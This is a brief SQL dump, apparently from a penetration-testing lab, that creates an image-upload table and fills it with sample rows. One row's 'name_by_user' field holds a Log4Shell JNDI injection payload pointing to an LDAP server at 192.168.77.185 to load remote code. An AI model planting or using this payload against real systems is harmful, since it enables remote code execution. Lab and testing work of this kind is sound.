CREATE DATABASE IF NOT EXISTS pentest_final;
USE pentest_final;

CREATE TABLE IF NOT EXISTS imgs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name_by_user VARCHAR(255) NOT NULL,
    name_on_server VARCHAR(255) NOT NULL
);

--
-- Dumping data for table `imgs`
--

INSERT INTO `imgs` (`id`, `name_by_user`, `name_on_server`) VALUES
(1, 'normal_is_boring', '0adc0220976e5599bfad5322a3b23f8e.jpg'),
(2, 'just_duck', '0ff2756ca177662da9d0b31dc9d2296b.jpg'),
(3, 'no_you_can\'t', 'de0683054b8e0244eeea37931c71ac99.jpg'),
(4, 'after_a_day', 'b0dda791f69a23f669d8de39a478dc2e.jpg'),
(5, 'test_upload', 'b896a31c226998343b68d835dca77249.png'),
(6, 'druk_guy', '5fb651086bdbff75457b01c5d9761deb.jpg'),
(7, 'omni_man', '0da44377fc2fdfe97d3eae781b89e0bd.jpg'),
(8, '${jndi:ldap://192.168.77.185:1389/Exploit}', '859b7487653efce062d0f3a2d7d8b624.jpg');